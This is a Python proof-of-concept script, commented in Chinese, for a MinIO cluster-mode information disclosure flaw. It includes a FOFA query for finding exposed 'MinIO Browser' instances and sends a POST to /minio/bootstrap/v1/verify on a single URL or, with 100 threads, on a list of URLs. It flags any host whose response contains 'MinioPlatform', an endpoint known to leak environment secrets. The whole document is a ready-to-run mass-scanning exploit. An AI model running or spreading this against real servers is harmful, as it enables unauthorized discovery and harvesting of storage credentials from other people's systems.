#MinIO集群模式信息泄露漏洞复现

# fofa数据如下
# title="MinIO Browser"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
  __  __ _       _____ ____  
 |  \/  (_)     |_   _/ __ \ 
 | \  / |_ _ __   | || |  | |
 | |\/| | | '_ \  | || |  | |
 | |  | | | | | |_| || |__| |
 |_|  |_|_|_| |_|_____\____/ 
                                                                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="MinIO集群模式信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/minio/bootstrap/v1/verify'
    url = target + url_payload
    header = {
        'Accept': '*/*',
        'Accept-Language': 'en-US;q=0.9,en;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url, headers=header, verify=False)
        if res.status_code == 200 and "MinioPlatform" in res.text: 
            print(target+"  [+]漏洞存在！！！") 
        else:
            print(target+"  [-]漏洞不存在。")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()